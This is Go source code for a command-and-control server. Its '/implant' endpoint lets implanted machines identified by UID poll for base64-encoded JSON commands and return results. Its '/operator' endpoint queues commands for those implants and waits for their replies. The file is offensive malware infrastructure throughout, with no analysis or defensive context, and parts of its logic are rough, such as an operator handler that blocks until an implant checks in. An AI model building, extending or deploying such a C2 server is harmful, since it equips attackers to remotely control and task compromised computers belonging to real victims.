package main
import (
    "fmt"
	"log"
	"net/http"
	"net"
    "encoding/base64"
    "encoding/json"
    "io/ioutil"
)

var err error
var serverIP string
var ip string
var cmdGroup string 
var cmdString string
var commandQueue [][]string 

type Command struct {
	Group    string `json:"Group"`
	String   string `json:"String"`
	Response string `json:"Response"`
}

var responseChan = make(chan interface{})

func main() {
    // Get the server's IP address

    // Start the server in a goroutine
    go startServer()

    select {}
}

func startServer() {
    http.HandleFunc("/implant", handleImplant)
    http.HandleFunc("/operator", handleOperator)
    serverIP, err := getServerIP()
    if err != nil {
        log.Fatal("Error:", err)
    }
    // Get the server's IP address
    if serverIP == "" {
        log.Fatal("Failed to determine server IP address")
    }
    fmt.Printf("Server started at http://%s:8443\n", serverIP)
	// Server configuration
	server := http.Server{
		Addr:      ":8443",
	}

	// Serve
    err = server.ListenAndServe()
    defer server.Close()
}

func getServerIP() (string, error) {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return "", fmt.Errorf("failed to retrieve interface addresses: %v", err)
    }

    for _, addr := range addrs {
        ipnet, ok := addr.(*net.IPNet)
        if !ok {
            continue
        }
        if ipnet.IP.IsGlobalUnicast() && ipnet.IP.To4() != nil {
			serverIP = ipnet.IP.String()
            return ipnet.IP.String(), nil
        }
    }
    return "", fmt.Errorf("unable to determine server IP address")
}


func handleImplant(w http.ResponseWriter, r *http.Request) {

    serializedData := r.Header.Get("Serialized-Data")
    uid := r.Header.Get("UID")
    
    fmt.Println("UID:", uid)

    // Receive response
	if uid != "" {
        fmt.Println("1")
		if serializedData != "" {
            fmt.Println("2")

            type Command struct {
                Group    string `json:"Group"`
                String   string `json:"String"`
                Response string `json:"Response"`
            }
            // Decode base64 data
            decodedData, err := base64.StdEncoding.DecodeString(serializedData)
            if err != nil {
                http.Error(w, "Failed to decode base64 data", http.StatusInternalServerError)
                return
            }

            // Unmarshal JSON data into Command struct
            var command Command
            err = json.Unmarshal(decodedData, &command)
            if err != nil {
                http.Error(w, "Failed to unmarshal JSON data", http.StatusInternalServerError)
                return
            }

                // Debugging
                // Print the JSON data
                jsonBytes, err := json.MarshalIndent(command, "", "    ")
                if err != nil {
                    http.Error(w, "Failed to marshal JSON", http.StatusInternalServerError)
                    return
                }
                fmt.Println("JSON:", string(jsonBytes))



				fmt.Fprintf(w, "Command received and processed successfully")

            } else {
                fmt.Println("3")
                http.Error(w, "No serialized data found in the request", http.StatusBadRequest)
            }
        } else {
            http.Error(w, "No UID found in the request", http.StatusBadRequest)
            return
        }                

        fmt.Println("Queue Len: ", len(commandQueue))

        // Provide next command to implant
        if len(commandQueue) != 0 {
            retrievedCMD := commandQueue[0]
            cmdGroup := retrievedCMD[0]
            cmdString := retrievedCMD[1]


    // Create a Command struct for the next command
            nextCommand := Command{
                Group:    cmdGroup,
                String:   cmdString,
                Response: "", // You might populate this if needed
            }

            // Marshal the Command struct to JSON
            jsonData, err := json.Marshal(nextCommand)
            if err != nil {
                http.Error(w, "Failed to marshal JSON data", http.StatusInternalServerError)
                return
            }

            // Base64 encode the JSON data
            base64Data := base64.StdEncoding.EncodeToString(jsonData)

            // Set response headers
            w.Header().Set("Content-Type", "text/plain")
            w.Header().Set("Content-Length", fmt.Sprint(len(base64Data)))

            // Write the response body
            fmt.Fprintf(w, "Serialized-Data: %s", base64Data)

            // Send the prepared data through the response channel
            responseChan <- string(base64Data)
            // Remove the processed command pair from the queue
            commandQueue = commandQueue[1:]
    }
}

func handleOperator(w http.ResponseWriter, r *http.Request) {
    fmt.Println("Received request from operator")
    // Only allow POST requests
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }

    // Read request body
    requestBody, err := ioutil.ReadAll(r.Body)
    if err != nil {
        http.Error(w, "Failed to read request body", http.StatusInternalServerError)
        return
    }

    // Decode base64 data
    decodedData, err := base64.StdEncoding.DecodeString(string(requestBody))
    if err != nil {
        http.Error(w, "Failed to decode base64 data", http.StatusInternalServerError)
        return
    }

    // Unmarshal JSON data
    var command Command
    err = json.Unmarshal(decodedData, &command)
    if err != nil {
        http.Error(w, "Failed to unmarshal JSON data", http.StatusInternalServerError)
        return
    }

    // Add the command to the commandQueue
    commandQueue = append(commandQueue, []string{command.Group, command.String})

    // Wait for the response from the implant
    response := <-responseChan

    // Marshal the response to JSON
    jsonResponse, err := json.Marshal(response)
    if err != nil {
        http.Error(w, "Failed to marshal JSON response", http.StatusInternalServerError)
        return
    }

    // Encode JSON response to base64
    encodedResponse := base64.StdEncoding.EncodeToString(jsonResponse)

    // Write the response back to the client
    w.Header().Set("Content-Type", "text/plain")
    w.WriteHeader(http.StatusOK)
    _, _ = w.Write([]byte(encodedResponse))
}

// Helper functions to convert uint32 to bytes and vice versa
func uint32ToBytes(n uint32) []byte {
    b := make([]byte, 4)
    b[0] = byte(n >> 24)
    b[1] = byte(n >> 16)
    b[2] = byte(n >> 8)
    b[3] = byte(n)
    return b
}

func bytesToUint32(b []byte) uint32 {
    return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}
